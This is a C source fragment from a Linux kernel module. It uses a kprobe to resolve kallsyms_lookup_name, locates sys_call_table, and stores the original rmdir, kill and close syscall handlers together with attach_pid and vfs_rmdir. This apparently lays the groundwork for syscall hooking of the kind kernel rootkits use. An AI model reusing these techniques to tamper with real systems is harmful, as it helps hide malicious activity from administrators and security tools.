#include "kernel_addr.h"

K_FUNC_FACTORY(void, attach_pid, ATTACH_PID_SGN) = NULL;
K_FUNC_FACTORY(void, vfs_rmdir, VFS_RMDIR_SGN) = NULL;

static void _kall_init(void) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
        static struct kprobe kps = {.symbol_name = "kallsyms_lookup_name"};
        register_kprobe(&kps);
        kallsyms_lookup_name_ptr = (kallsyms_lookup_name_t)kps.addr;
        unregister_kprobe(&kps);
#else
        kallsyms_lookup_name_ptr = (kallsyms_lookup_name_t)kallsyms_lookup_name;
#endif
}


static unsigned long *_kall_syscall_table_get(void)
{
    static unsigned long *sct;
    if (!sct)
        sct = (unsigned long*)kall_load("sys_call_table");
    return sct;
}

void kall_load_addr(void)
{
    _kall_init();
    K_FUNC_FACTORY_LOAD(void, attach_pid, ATTACH_PID_SGN);
    K_FUNC_FACTORY_LOAD(void, vfs_rmdir, VFS_RMDIR_SGN);
}

struct kernel_syscalls *kall_syscall_table_load(void)
{
    static struct kernel_syscalls ksys;
    void **sct = (void*)_kall_syscall_table_get();

    if (!sct)
        goto error;

    if (!ksys.o_sys_close /* pick one to check */) {
        ksys.o_sys_rmdir = sct[__NR_rmdir];
        ksys.o_sys_kill = sct[__NR_kill];
        ksys.o_sys_close = sct[__NR_close];
    }
    return &ksys;
error:
    return NULL;
}
